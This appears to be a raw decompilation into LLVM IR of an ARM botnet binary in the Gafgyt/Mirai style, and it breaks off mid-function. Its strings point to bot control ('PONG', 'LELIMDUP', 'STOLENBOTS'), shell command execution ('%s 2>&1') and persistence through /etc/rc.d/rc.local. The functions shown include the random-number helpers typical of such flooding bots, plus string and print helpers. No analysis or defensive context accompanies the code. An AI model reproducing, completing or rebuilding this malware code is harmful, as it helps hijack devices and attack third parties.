@global_var_19938.543 = constant [19 x i8] c"/etc/rc.d/rc.local\00"
@1 = constant i32 114
@global_var_19950.547 = constant [13 x i8] c"/etc/rc.conf\00"
@global_var_19960.549 = constant i32 47
@global_var_19964.551 = constant [8 x i8] c"\22%s%s\22\0A\00"
@global_var_1996c.553 = constant i32 97
@global_var_19970.555 = constant [13 x i8] c"fork failed\0A\00"
@global_var_19980.559 = constant i32 993090331
@global_var_199e8.564 = constant [5 x i8] c"PONG\00"
@global_var_199f0.566 = constant [9 x i8] c"LELIMDUP\00"
@global_var_199fc.568 = constant [20 x i8] c"PEACE OUT IMMA DUP\0A\00"
@global_var_19a10.570 = constant [11 x i8] c"STOLENBOTS\00"
@global_var_19a1c.572 = constant [8 x i8] c"%s 2>&1\00"
@global_var_19a24.574 = constant [3 x i8] c"%s\00"
@global_var_19a28.576 = constant i32 32
@global_var_2a3b8.578 = global i32 0
@global_var_23df4 = external global i32
@global_var_23dfc = external local_unnamed_addr global i32
@global_var_2a3c8.588 = global i32 0
@global_var_23e30.594 = global i32 0
@global_var_28194.596 = global i32 0
@global_var_127a8.598 = constant i32 -481296384
@global_var_fccc.599 = constant i32 -442564544
@global_var_28198.601 = global i32 0
@global_var_23e48.607 = global i32 2
@global_var_23e18.613 = global i32 0
@global_var_10084.614 = constant i32 -442564492
@global_var_23e14.616 = global i32* bitcast (i8** @global_var_23e4c.583 to i32*)
@global_var_1a02c.622 = constant i32 0
@global_var_10244.627 = constant i32 -382910448
@global_var_13e58.628 = constant i32 -382909968
@global_var_13f14.629 = constant i32 -382910224
@global_var_1a060.631 = constant i32 135270416
@global_var_1a044.633 = constant [6 x i8] c"(nil)\00"
@global_var_1a04c.636 = constant [7 x i8] c"(null)\00"
@global_var_1a054.638 = constant i32 2949163
@global_var_1a0e0.641 = constant i32 16843008
@global_var_1a0c8.643 = constant i32 327688
@global_var_1a0c0.648 = constant [8 x i8] c" +0-#'I\00"
@global_var_1a068.650 = constant [9 x i8] c"hlLjztqZ\00"
@global_var_1a0a8.652 = constant [21 x i8] c"npxXoudifFeEgGaACScs\00"
@global_var_1a09b.654 = constant i32 117506048
@global_var_1a09c.656 = constant i32 252117248
@global_var_1a08c.658 = constant i32 331776
@global_var_1a07c.660 = constant i32 335616
@global_var_1179c.692 = constant i32 -456978431
@global_var_1a0fc.698 = constant [8 x i8] c"Success\00"
@global_var_1a0ec.700 = constant [15 x i8] c"Unknown error \00"
@global_var_1ad8a.702 = constant i32 65536
@global_var_24130.703 = global i32* @global_var_1ad8a.702
@global_var_2a19c.706 = global i32 0
@global_var_2a1a0.709 = global i32 0
@global_var_2a37c.711 = global i32 0
@global_var_2a1b0.713 = global i32 0
@global_var_24138.715 = global i32 0
@global_var_2a4b4.720 = global i32 0
@global_var_2a4a8.723 = global i32 0
@global_var_2a400.725 = global i32 0
@global_var_2a390.727 = global i32 0
@global_var_24038.730 = global i32 256
@global_var_23f3c.731 = global i32* @global_var_24038.730
@global_var_2a480.735 = global i32 0
@global_var_13c9c.736 = constant i32 -382910416
@global_var_12828.743 = constant i32 -442564520
@global_var_24044.749 = global i32 0
@global_var_fa98.751 = constant i32 -481230848
@global_var_2a3a8.753 = global i32 0
@global_var_f684.755 = constant i32 -509587456
@global_var_2405c.757 = global i32 0
@global_var_24074 = external global i32
@global_var_24094.763 = global i32 -1726662223
@global_var_2407c.770 = local_unnamed_addr global i32* @global_var_24094.763
@global_var_24078.772 = global i32* @global_var_24094.763
@global_var_1ac58.786 = constant i32 0
@global_var_24110.795 = global i32 0
@global_var_2a3ac.799 = local_unnamed_addr global i32 0
@global_var_1018c.802 = constant i32 -382910416
@global_var_2a3b4.804 = global i32 0
@global_var_23088.808 = global i32 -1
@global_var_2a3bc.811 = global i32 0
@global_var_2a3c0.813 = local_unnamed_addr global i32 0
@global_var_13760.814 = constant i32 -390234096
@global_var_1ac80.816 = constant [10 x i8] c"/dev/null\00"
@global_var_2a3c4.818 = global i32 0
@global_var_1010c.822 = constant i32 -382909968
@global_var_2a3b0.824 = local_unnamed_addr global i32 0
@global_var_11710.827 = constant i32 -369095438
@global_var_24128 = external local_unnamed_addr global i32
@global_var_fb98.838 = constant i32 -442564608
@global_var_13a28.840 = constant i32 -335544720
@global_var_13b60.843 = constant i32 -275775369
@global_var_2a3ec.845 = global i32 0
@global_var_2a3cc.847 = global i32 0
@global_var_1af8c.849 = constant [4 x i8] c"inf\00"
@global_var_1af8f.853 = constant i32 1179535616
@global_var_1af9c.855 = constant i32 2883630
@global_var_11398.857 = constant i32 -382908944
@global_var_2a3d0.865 = global i32 0
@global_var_2a3e8.870 = local_unnamed_addr global i32 0
@global_var_f6d8.875 = constant i32 -382910448
@global_var_2a4b8.878 = global i32 0
@global_var_1afe8.880 = constant i32 46
@global_var_2a498.882 = global i32 0
@global_var_15964.884 = constant i32 -369098656
@global_var_1afec.891 = constant [17 x i8] c"/etc/resolv.conf\00"
@global_var_1b000.893 = constant i32 114
@global_var_1b004.895 = constant [24 x i8] c"/etc/config/resolv.conf\00"
@global_var_1b01c.898 = constant [11 x i8] c"nameserver\00"
@global_var_1b028.901 = constant [7 x i8] c"domain\00"
@global_var_1b030.903 = constant [7 x i8] c"search\00"
@global_var_2a4bc.908 = global i32 0
@global_var_2a4c0.910 = global i32 0
@global_var_1b04c.919 = constant [17 x i8] c"0123456789abcdef\00"
@global_var_1b038.921 = constant i32 0
@global_var_1b060.924 = constant [3 x i8] c"%x\00"
@global_var_1b064.927 = constant [11 x i8] c"/etc/hosts\00"
@global_var_1b070.929 = constant [18 x i8] c"/etc/config/hosts\00"
@global_var_2308c.933 = global i32 0
@global_var_24154.5 = external global i8*
@global_var_2418b.73 = external global i8*
@global_var_2418c.74 = local_unnamed_addr global i8 0
@global_var_2418d.75 = local_unnamed_addr global i8 0
@global_var_2418e.76 = local_unnamed_addr global i8 0
@2 = internal constant [3 x i8] c" \01\00"
@global_var_23e4c.583 = global i8* getelementptr inbounds ([3 x i8], [3 x i8]* @2, i32 0, i32 0)
@global_var_23e9c.584 = local_unnamed_addr global i8 16
@global_var_13774.590 = constant i8 0
@global_var_23e4d.619 = local_unnamed_addr global i8 1
@global_var_23e9d.620 = local_unnamed_addr global i8 1
@3 = internal constant [2 x i8] c"\01\00"
@global_var_24134.872 = global i8* getelementptr inbounds ([2 x i8], [2 x i8]* @3, i32 0, i32 0)
@global_var_24135.873 = local_unnamed_addr global i8 0
@global_var_1994c.545 = constant [2 x i8] c"r\00"

declare void @__pseudo_branch(i32) local_unnamed_addr

declare void @__pseudo_cond_branch(i1, i32) local_unnamed_addr

define i32 @_init() local_unnamed_addr {
entry:
  %v3_8098 = load i32, i32* @r4, align 4
  %v0_80a0 = call i32 @frame_dummy()
  store i32 %v0_80a0, i32* @r0, align 4
  %v1_80a4 = call i32 @__do_global_ctors_aux(i32 %v0_80a0)
  call void @__pseudo_branch(i32 %v3_8098)
  ret i32 %v1_80a4
}

define i32 @__do_global_dtors_aux() local_unnamed_addr {
entry:
  %r2.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %v3_80b0 = load i32, i32* @r4, align 4
  store i32 %v3_80b0, i32* %stack_var_-12, align 4
  store i32 ptrtoint (i8** @global_var_24154.5 to i32), i32* %r5.global-to-local, align 4
  %v2_80b8 = load i8, i8* bitcast (i8** @global_var_24154.5 to i8*), align 4
  %v2_80bc = icmp eq i8 %v2_80b8, 0
  br i1 %v2_80bc, label %bb7, label %bb

bb:                                               ; preds = %entry
  %v12_80c0 = load i32, i32* @r0, align 4
  ret i32 %v12_80c0

bb7:                                              ; preds = %entry
  store i32 ptrtoint (i32** @global_var_230a4.8 to i32), i32* %r4.global-to-local, align 4
  %v2_80c8 = load i32, i32* bitcast (i32** @global_var_230a4.8 to i32*), align 4
  store i32 %v2_80c8, i32* %r2.global-to-local, align 4
  %v2_80d0 = icmp eq i32 %v2_80c8, 0
  br i1 %v2_80d0, label %bb8, label %dec_label_pc_80d8

dec_label_pc_80d8:                                ; preds = %bb7, %dec_label_pc_80d8.dec_label_pc_80d8_crit_edge
  %v1_80dc = phi i32 [ %v1_80dc.pre, %dec_label_pc_80d8.dec_label_pc_80d8_crit_edge ], [ ptrtoint (i32** @global_var_230a4.8 to i32), %bb7 ]
  %v0_80d8 = phi i32 [ %v2_80e8, %dec_label_pc_80d8.dec_label_pc_80d8_crit_edge ], [ %v2_80c8, %bb7 ]
  %v1_80d8 = add i32 %v0_80d8, 4
  %v2_80dc = inttoptr i32 %v1_80dc to i32*
  store i32 %v1_80d8, i32* %v2_80dc, align 4
  %v0_80e4 = load i32, i32* %r2.global-to-local, align 4
  call void @__pseudo_branch(i32 %v0_80e4)
  %v2_80e8 = load i32, i32* bitcast (i32** @global_var_230a4.8 to i32*), align 4
  store i32 %v2_80e8, i32* %r2.global-to-local, align 4
  %v2_80f0 = icmp eq i32 %v2_80e8, 0
  br i1 %v2_80f0, label %.loopexit, label %dec_label_pc_80d8.dec_label_pc_80d8_crit_edge

dec_label_pc_80d8.dec_label_pc_80d8_crit_edge:    ; preds = %dec_label_pc_80d8
  %v1_80dc.pre = load i32, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_80d8

.loopexit:                                        ; preds = %dec_label_pc_80d8
  %v2_8110.pre = load i32, i32* %r5.global-to-local, align 4
  br label %bb8

bb8:                                              ; preds = %.loopexit, %bb7
  %v2_8110 = phi i32 [ %v2_8110.pre, %.loopexit ], [ ptrtoint (i8** @global_var_24154.5 to i32), %bb7 ]
  %v3_8110 = inttoptr i32 %v2_8110 to i8*
  store i8 1, i8* %v3_8110, align 1
  %v2_8114 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_8114, i32* %r4.global-to-local, align 4
  %v11_8114 = load i32, i32* @r0, align 4
  ret i32 %v11_8114

; uselistorder directives
  uselistorder i32 %v2_80e8, { 1, 2, 0 }
  uselistorder i32** @global_var_230a4.8, { 1, 0 }
  uselistorder i8** @global_var_24154.5, { 1, 0 }
  uselistorder label %dec_label_pc_80d8, { 1, 0 }
}

define i32 @call___do_global_dtors_aux() local_unnamed_addr {
entry:
  %v5_812c = load i32, i32* @r0, align 4
  ret i32 %v5_812c
}

define i32 @frame_dummy() local_unnamed_addr {
.thread:
  %v2_8150 = load i32, i32* @global_var_23098.18, align 4
  %v2_8154 = icmp eq i32 %v2_8150, 0
  br i1 %v2_8154, label %bb, label %bb2

bb:                                               ; preds = %.thread
  ret i32 ptrtoint (i32* @global_var_23098.18 to i32)

bb2:                                              ; preds = %.thread
  ret i32 ptrtoint (i32* @global_var_23098.18 to i32)

; uselistorder directives
  uselistorder i32* @global_var_23098.18, { 1, 0 }
}

define i32 @call_frame_dummy() local_unnamed_addr {
entry:
  %v5_818c = load i32, i32* @r0, align 4
  ret i32 %v5_818c
}

; Function Attrs: noreturn
define i32 @_start(i32 %arg1, i32 %arg2) local_unnamed_addr #0 {
entry:
  %stack_var_4 = alloca i32, align 4
  %v4_8198 = ptrtoint i32* %stack_var_4 to i32
  %v8_81b8 = call i32 @__uClibc_main(i32 ptrtoint (i32* @global_var_e5d0.22 to i32), i32 %arg2, i32* nonnull %stack_var_4, i32 32916, i32 95524, i32 %arg1, i32 %v4_8198)
  %v0_81bc = call i32 @abort()
  ret i32 %v0_81bc
}

define i32 @init_rand(i32 %arg1) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %v0_81dc = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_81dc, i32* @global_var_24190.25, align 4
  %v1_81fc = add i32 %v0_81dc, -1640531527
  store i32 %v1_81fc, i32* @global_var_24194.26, align 4
  %v1_8218 = add i32 %v0_81dc, 1013904242
  store i32 %v1_8218, i32* @global_var_24198.27, align 4
  br label %dec_label_pc_8230

dec_label_pc_8230:                                ; preds = %entry, %dec_label_pc_8230
  %storemerge12 = phi i32 [ 3, %entry ], [ %v1_8274, %dec_label_pc_8230 ]
  store i32 %storemerge12, i32* %r0.global-to-local, align 4
  %tmp = mul i32 %storemerge12, 4
  %v5_8240 = add i32 %tmp, add (i32 ptrtoint (i32* @global_var_24190.25 to i32), i32 -12)
  %v6_8240 = inttoptr i32 %v5_8240 to i32*
  %v7_8240 = load i32, i32* %v6_8240, align 4
  %tmp9 = mul i32 %storemerge12, 4
  %v5_8250 = add i32 %tmp9, add (i32 ptrtoint (i32* @global_var_24190.25 to i32), i32 -8)
  %v6_8250 = inttoptr i32 %v5_8250 to i32*
  %v7_8250 = load i32, i32* %v6_8250, align 4
  %v2_8254 = xor i32 %storemerge12, -1640531527
  %v2_825c = xor i32 %v2_8254, %v7_8240
  %v2_8264 = xor i32 %v2_825c, %v7_8250
  %v5_826c = mul nuw nsw i32 %storemerge12, 4
  %v6_826c = add i32 %v5_826c, ptrtoint (i32* @global_var_24190.25 to i32)
  %v7_826c = inttoptr i32 %v6_826c to i32*
  store i32 %v2_8264, i32* %v7_826c, align 4
  %v1_8274 = add nuw nsw i32 %storemerge12, 1
  %v7_828c = icmp slt i32 %v1_8274, 4096
  br i1 %v7_828c, label %dec_label_pc_8230, label %dec_label_pc_8290

dec_label_pc_8290:                                ; preds = %dec_label_pc_8230
  %v9_8294 = load i32, i32* %r0.global-to-local, align 4
  ret i32 %v9_8294

; uselistorder directives
  uselistorder i32 %storemerge12, { 5, 3, 2, 0, 1, 4 }
  uselistorder i32* %r0.global-to-local, { 2, 3, 0, 1 }
  uselistorder label %dec_label_pc_8230, { 1, 0 }
}

define i32 @rand_cmwc() local_unnamed_addr {
entry:
  %r1.global-to-local = alloca i32, align 4
  %stack_var_0 = alloca i32, align 4
  %v1_82a0 = ptrtoint i32* %stack_var_0 to i32
  store i32 %v1_82a0, i32* @ip, align 4
  %v2_82d0 = load i32, i32* @global_var_23dec.30, align 4
  %v1_82d4 = add i32 %v2_82d0, 1
  %v3_82dc = urem i32 %v1_82d4, 4096
  store i32 %v3_82dc, i32* @global_var_23dec.30, align 4
  %v4_82f4 = mul nuw nsw i32 %v3_82dc, 4
  %v5_82f4 = add i32 %v4_82f4, ptrtoint (i32* @global_var_24190.25 to i32)
  %v6_82f4 = inttoptr i32 %v5_82f4 to i32*
  %v7_82f4 = load i32, i32* %v6_82f4, align 4
  %v2_830c = mul i32 %v7_82f4, 18782
  store i32 %v2_830c, i32* %r1.global-to-local, align 4
  %v2_8324 = load i32, i32* @global_var_23de8.33, align 4
  %v2_832c = add i32 %v2_8324, %v2_830c
  %v3_832c = icmp ult i32 %v2_832c, %v2_8324
  %v4_8330 = zext i1 %v3_832c to i32
  %v2_8360 = add i32 %v4_8330, %v2_832c
  %v3_8374 = icmp ult i32 %v2_8360, %v4_8330
  br i1 %v3_8374, label %dec_label_pc_837c, label %dec_label_pc_839c

dec_label_pc_837c:                                ; preds = %entry
  %v1_8380 = add i32 %v2_8360, 1
  %v1_8390 = select i1 %v3_832c, i32 2, i32 1
  br label %dec_label_pc_839c

dec_label_pc_839c:                                ; preds = %entry, %dec_label_pc_837c
  %storemerge = phi i32 [ %v1_8390, %dec_label_pc_837c ], [ %v4_8330, %entry ]
  %stack_var_-28.0 = phi i32 [ %v1_8380, %dec_label_pc_837c ], [ %v2_8360, %entry ]
  store i32 %storemerge, i32* @global_var_23de8.33, align 4
  store i32 %v3_82dc, i32* %r1.global-to-local, align 4
  %v2_83ac = sub i32 -2, %stack_var_-28.0
  store i32 %v2_83ac, i32* %v6_82f4, align 4
  %v1_83bc = load i32, i32* %r1.global-to-local, align 4
  %v4_83bc = mul i32 %v1_83bc, 4
  %v5_83bc = add i32 %v4_83bc, ptrtoint (i32* @global_var_24190.25 to i32)
  %v6_83bc = inttoptr i32 %v5_83bc to i32*
  %v7_83bc = load i32, i32* %v6_83bc, align 4
  ret i32 %v7_83bc

; uselistorder directives
  uselistorder i32 %v4_8330, { 0, 2, 1 }
  uselistorder i32 %v2_8324, { 1, 0 }
  uselistorder i32 %v3_82dc, { 2, 1, 0 }
  uselistorder i32* @global_var_24190.25, { 1, 0 }
  uselistorder i32 ptrtoint (i32* @global_var_24190.25 to i32), { 2, 3, 4, 0, 1 }
  uselistorder label %dec_label_pc_839c, { 1, 0 }
}

define i32 @trim(i8* %arg1) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i8* %arg1 to i32
  store i32 %tmp, i32* %r0.global-to-local, align 4
  %stack_var_-32 = alloca i8*, align 4
  %stack_var_0 = alloca i32, align 4
  %v1_83d8 = ptrtoint i32* %stack_var_0 to i32
  store i32 %v1_83d8, i32* @ip, align 4
  store i8* %arg1, i8** %stack_var_-32, align 4
  store i32 %tmp, i32* %r0.global-to-local, align 4
  %v3_83f8 = call i32 @strlen(i8* %arg1)
  store i32 %v3_83f8, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_8418

dec_label_pc_8418:                                ; preds = %dec_label_pc_8418, %entry
  %stack_var_-24.0 = phi i32 [ 0, %entry ], [ %v1_8410, %dec_label_pc_8418 ]
  %v3_8420 = load i8*, i8** %stack_var_-32, align 4
  %v4_8420 = ptrtoint i8* %v3_8420 to i32
  %v2_8424 = add i32 %v4_8420, %stack_var_-24.0
  %v1_8428 = inttoptr i32 %v2_8424 to i8*
  %v2_8428 = load i8, i8* %v1_8428, align 1
  %v3_8428 = zext i8 %v2_8428 to i32
  store i32 %v3_8428, i32* %r0.global-to-local, align 4
  %v1_8430 = call i32 @isspace(i32 %v3_8428)
  store i32 %v1_8430, i32* %r0.global-to-local, align 4
  %v2_8438 = icmp eq i32 %v1_8430, 0
  %v1_8410 = add i32 %stack_var_-24.0, 1
  br i1 %v2_8438, label %dec_label_pc_8450.preheader, label %dec_label_pc_8418

dec_label_pc_8450.preheader:                      ; preds = %dec_label_pc_8418
  %v1_8400 = add i32 %v3_83f8, -1
  %v5_845c10 = icmp slt i32 %v1_8400, %stack_var_-24.0
  br i1 %v5_845c10, label %dec_label_pc_84d0.preheader, label %dec_label_pc_8460

dec_label_pc_8444:                                ; preds = %dec_label_pc_8460
  %v1_8448 = add i32 %stack_var_-20.011, -1
  %v5_845c = icmp slt i32 %v1_8448, %stack_var_-24.0
  br i1 %v5_845c, label %dec_label_pc_84d0.preheader, label %dec_label_pc_8460

dec_label_pc_8460:                                ; preds = %dec_label_pc_8450.preheader, %dec_label_pc_8444
  %stack_var_-20.011 = phi i32 [ %v1_8448, %dec_label_pc_8444 ], [ %v1_8400, %dec_label_pc_8450.preheader ]
  %v3_8468 = load i8*, i8** %stack_var_-32, align 4
  %v4_8468 = ptrtoint i8* %v3_8468 to i32
  %v2_846c = add i32 %v4_8468, %stack_var_-20.011
  %v1_8470 = inttoptr i32 %v2_846c to i8*
  %v2_8470 = load i8, i8* %v1_8470, align 1
  %v3_8470 = zext i8 %v2_8470 to i32
  store i32 %v3_8470, i32* %r0.global-to-local, align 4
  %v1_8478 = call i32 @isspace(i32 %v3_8470)
  store i32 %v1_8478, i32* %r0.global-to-local, align 4
  %v2_8480 = icmp eq i32 %v1_8478, 0
  br i1 %v2_8480, label %dec_label_pc_84d0.preheader, label %dec_label_pc_8444

dec_label_pc_84d0.preheader:                      ; preds = %dec_label_pc_8444, %dec_label_pc_8460, %dec_label_pc_8450.preheader
  %stack_var_-20.0.lcssa = phi i32 [ %v1_8400, %dec_label_pc_8450.preheader ], [ %v1_8448, %dec_label_pc_8444 ], [ %stack_var_-20.011, %dec_label_pc_8460 ]
  br label %dec_label_pc_84d0

dec_label_pc_8494:                                ; preds = %dec_label_pc_84d0
  %v2_84b8 = add i32 %v4_84f0, %storemerge1
  %v1_84bc = inttoptr i32 %v2_84b8 to i8*
  %v2_84bc = load i8, i8* %v1_84bc, align 1
  %v3_84c0 = inttoptr i32 %v2_84f4 to i8*
  store i8 %v2_84bc, i8* %v3_84c0, align 1
  %v1_84c8 = add i32 %storemerge1, 1
  br label %dec_label_pc_84d0

dec_label_pc_84d0:                                ; preds = %dec_label_pc_84d0.preheader, %dec_label_pc_8494
  %storemerge1 = phi i32 [ %v1_84c8, %dec_label_pc_8494 ], [ %stack_var_-24.0, %dec_label_pc_84d0.preheader ]
  %v7_84dc = icmp sgt i32 %storemerge1, %stack_var_-20.0.lcssa
  %v2_84e8 = sub i32 %storemerge1, %stack_var_-24.0
  %v3_84f0 = load i8*, i8** %stack_var_-32, align 4
  %v4_84f0 = ptrtoint i8* %v3_84f0 to i32
  %v2_84f4 = add i32 %v4_84f0, %v2_84e8
  br i1 %v7_84dc, label %dec_label_pc_84e0, label %dec_label_pc_8494

dec_label_pc_84e0:                                ; preds = %dec_label_pc_84d0
  %v3_84fc = inttoptr i32 %v2_84f4 to i8*
  store i8 0, i8* %v3_84fc, align 1
  %v9_8504 = load i32, i32* %r0.global-to-local, align 4
  ret i32 %v9_8504

; uselistorder directives
  uselistorder i32 %storemerge1, { 2, 3, 0, 1 }
  uselistorder i32 %v1_8400, { 1, 0, 2 }
  uselistorder i32 %stack_var_-24.0, { 1, 0, 2, 3, 5, 4 }
  uselistorder i8** %stack_var_-32, { 3, 2, 1, 0 }
  uselistorder i32* %r0.global-to-local, { 4, 2, 1, 5, 3, 7, 6, 0 }
  uselistorder i32 (i32)* @isspace, { 1, 0 }
  uselistorder i8* %arg1, { 1, 0, 2 }
  uselistorder label %dec_label_pc_84d0, { 1, 0 }
  uselistorder label %dec_label_pc_84d0.preheader, { 1, 0, 2 }
  uselistorder label %dec_label_pc_8460, { 1, 0 }
}

define i32 @printchar(i32* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  store i32 %tmp, i32* %r0.global-to-local, align 4
  %stack_var_-24 = alloca i32, align 4
  %stack_var_0 = alloca i32, align 4
  %v1_8508 = ptrtoint i32* %stack_var_0 to i32
  store i32 %v1_8508, i32* @ip, align 4
  %v0_8518 = load i32, i32* %r0.global-to-local, align 4
  store i32 %arg2, i32* %stack_var_-24, align 4
  %v2_8524 = icmp eq i32 %v0_8518, 0
  br i1 %v2_8524, label %dec_label_pc_8558, label %dec_label_pc_852c

dec_label_pc_852c:                                ; preds = %entry
  %v1_8530 = inttoptr i32 %v0_8518 to i32*
  %v2_8530 = load i32, i32* %v1_8530, align 4
  %v1_853c = trunc i32 %arg2 to i8
  %v3_853c = inttoptr i32 %v2_8530 to i8*
  store i8 %v1_853c, i8* %v3_853c, align 1
  %v2_8544 = load i32, i32* %v1_8530, align 4
  %v1_8548 = add i32 %v2_8544, 1
  store i32 %v1_8548, i32* %v1_8530, align 4
  %v9_8570.pre = load i32, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_856c

dec_label_pc_8558:                                ; preds = %entry
  store i32 1, i32* %r0.global-to-local, align 4
  store i32 1, i32* @r2, align 4
  %v3_8568 = call i32 @__libc_write(i32 1, i32* nonnull %stack_var_-24)
  store i32 %v3_8568, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_856c

dec_label_pc_856c:                                ; preds = %dec_label_pc_852c, %dec_label_pc_8558
  %v9_8570 = phi i32 [ %v9_8570.pre, %dec_label_pc_852c ], [ %v3_8568, %dec_label_pc_8558 ]
  ret i32 %v9_8570

; uselistorder directives
  uselistorder i32* %r0.global-to-local, { 4, 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_856c, { 1, 0 }
}

define i32 @prints(i32 %arg1, i8* %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
entry:
  %tmp = ptrtoint i8* %arg2 to i32
  %stack_var_-48 = alloca i32, align 4
  %stack_var_0 = alloca i32, align 4
  %v1_8574 = ptrtoint i32* %stack_var_0 to i32
  store i32 %v1_8574, i32* @ip, align 4
  %v3_8578 = load i32, i32* @fp, align 4
  store i32 0, i32* %stack_var_-48, align 4
  %tmp42 = icmp slt i32 %arg3, 1
  br i1 %tmp42, label %dec_label_pc_8630, label %dec_label_pc_85b0

dec_label_pc_85b0:                                ; preds = %entry
  %v2_85e019 = load i8, i8* %arg2, align 1
  %v2_85e421 = icmp eq i8 %v2_85e019, 0
  br i1 %v2_85e421, label %dec_label_pc_85ec, label %dec_label_pc_85c4

dec_label_pc_85c4:                                ; preds = %dec_label_pc_85b0, %dec_label_pc_85c4
  %v4_85dc23 = phi i32 [ %v1_85d4, %dec_label_pc_85c4 ], [ %tmp, %dec_label_pc_85b0 ]
  %stack_var_-40.022 = phi i32 [ %v1_85c8, %dec_label_pc_85c4 ], [ 0, %dec_label_pc_85b0 ]
  %v1_85c8 = add i32 %stack_var_-40.022, 1
  %v1_85d4 = add i32 %v4_85dc23, 1
  %v5_85d8 = inttoptr i32 %v1_85d4 to i8*
  %v2_85e0 = load i8, i8* %v5_85d8, align 1
  %v2_85e4 = icmp eq i8 %v2_85e0, 0
  br i1 %v2_85e4, label %dec_label_pc_85ec, label %dec_label_pc_85c4

dec_label_pc_85ec:                                ; preds = %dec_label_pc_85c4, %dec_label_pc_85b0
  %stack_var_-40.0.lcssa = phi i32 [ 0, %dec_label_pc_85b0 ], [ %v1_85c8, %dec_label_pc_85c4 ]
  %v5_85f8 = icmp slt i32 %stack_var_-40.0.lcssa, %arg3
  br i1 %v5_85f8, label %dec_label_pc_8608, label %dec_label_pc_8618

dec_label_pc_8608:                                ; preds = %dec_label_pc_85ec
  %v2_8610 = sub i32 %arg3, %stack_var_-40.0.lcssa
  br label %dec_label_pc_8618

dec_label_pc_8618:                                ; preds = %dec_label_pc_85ec, %dec_label_pc_8608
  %storemerge3 = phi i32 [ %v2_8610, %dec_label_pc_8608 ], [ 0, %dec_label_pc_85ec ]
  %v1_861c = and i32 %arg4, 2
  %v2_8620 = icmp eq i32 %v1_861c, 0
  br i1 %v2_8620, label %dec_label_pc_8630, label %dec_label_pc_8628

dec_label_pc_8628:                                ; preds = %dec_label_pc_8618
  br label %dec_label_pc_8630

dec_label_pc_8630:                                ; preds = %dec_label_pc_8618, %entry, %dec_label_pc_8628
  %stack_var_-28.0 = phi i32 [ %arg3, %entry ], [ %storemerge3, %dec_label_pc_8618 ], [ %storemerge3, %dec_label_pc_8628 ]
  %stack_var_-44.0 = phi i32 [ 32, %entry ], [ 32, %dec_label_pc_8618 ], [ 48, %dec_label_pc_8628 ]
  %v1_8634 = urem i32 %arg4, 2
  %v2_8638 = icmp eq i32 %v1_8634, 0
  br i1 %v2_8638, label %dec_label_pc_8668.preheader, label %dec_label_pc_86a4.preheader

dec_label_pc_8668.preheader:                      ; preds = %dec_label_pc_8630
  %v5_867016 = icmp sgt i32 %stack_var_-28.0, 0
  br i1 %v5_867016, label %dec_label_pc_8644.lr.ph, label %dec_label_pc_86a4.preheader

dec_label_pc_8644.lr.ph:                          ; preds = %dec_label_pc_8668.preheader
  %v2_864c = inttoptr i32 %arg1 to i32*
  br label %dec_label_pc_8644

dec_label_pc_8644:                                ; preds = %dec_label_pc_8644.lr.ph, %dec_label_pc_8644
  %stack_var_-28.117 = phi i32 [ %stack_var_-28.0, %dec_label_pc_8644.lr.ph ], [ %v1_8660, %dec_label_pc_8644 ]
  %v3_864c = call i32 @printchar(i32* %v2_864c, i32 %stack_var_-44.0)
  %v3_8650 = load i32, i32* %stack_var_-48, align 4
  %v1_8654 = add i32 %v3_8650, 1
  store i32 %v1_8654, i32* %stack_var_-48, align 4
  %v1_8660 = add nsw i32 %stack_var_-28.117, -1
  %v5_8670 = icmp sgt i32 %stack_var_-28.117, 1
  br i1 %v5_8670, label %dec_label_pc_8644, label %dec_label_pc_86a4.preheader

dec_label_pc_86a4.preheader:                      ; preds = %dec_label_pc_8644, %dec_label_pc_8668.preheader, %dec_label_pc_8630
  %v3_86e827 = phi i32 [ 0, %dec_label_pc_8630 ], [ 0, %dec_label_pc_8668.preheader ], [ %v1_8654, %dec_label_pc_8644 ]
  %stack_var_-28.2.ph = phi i32 [ %stack_var_-28.0, %dec_label_pc_8630 ], [ %stack_var_-28.0, %dec_label_pc_8668.preheader ], [ 0, %dec_label_pc_8644 ]
  %v2_86a89 = load i8, i8* %arg2, align 1
  %v2_86ac11 = icmp eq i8 %v2_86a89, 0
  br i1 %v2_86ac11, label %dec_label_pc_86dc.preheader, label %dec_label_pc_8678.lr.ph

dec_label_pc_8678.lr.ph:                          ; preds = %dec_label_pc_86a4.preheader
  %v2_8688 = inttoptr i32 %arg1 to i32*
  br label %dec_label_pc_8678

dec_label_pc_8678:                                ; preds = %dec_label_pc_8678.lr.ph, %dec_label_pc_8678
  %v4_86a413 = phi i32 [ %tmp, %dec_label_pc_8678.lr.ph ], [ %v1_869c, %dec_label_pc_8678 ]
  %stack_var_-24.012 = phi i8* [ %arg2, %dec_label_pc_8678.lr.ph ], [ %v5_86a0, %dec_label_pc_8678 ]
  %v2_867c = load i8, i8* %stack_var_-24.012, align 1
  %v3_867c = zext i8 %v2_867c to i32
  %v3_8688 = call i32 @printchar(i32* %v2_8688, i32 %v3_867c)
  %v3_868c = load i32, i32* %stack_var_-48, align 4
  %v1_8690 = add i32 %v3_868c, 1
  store i32 %v1_8690, i32* %stack_var_-48, align 4
  %v1_869c = add i32 %v4_86a413, 1
  %v5_86a0 = inttoptr i32 %v1_869c to i8*
  %v2_86a8 = load i8, i8* %v5_86a0, align 1
  %v2_86ac = icmp eq i8 %v2_86a8, 0
  br i1 %v2_86ac, label %dec_label_pc_86dc.preheader, label %dec_label_pc_8678

dec_label_pc_86dc.preheader:                      ; preds = %dec_label_pc_8678, %dec_label_pc_86a4.preheader
  %v3_86e826 = phi i32 [ %v3_86e827, %dec_label_pc_86a4.preheader ], [ %v1_8690, %dec_label_pc_8678 ]
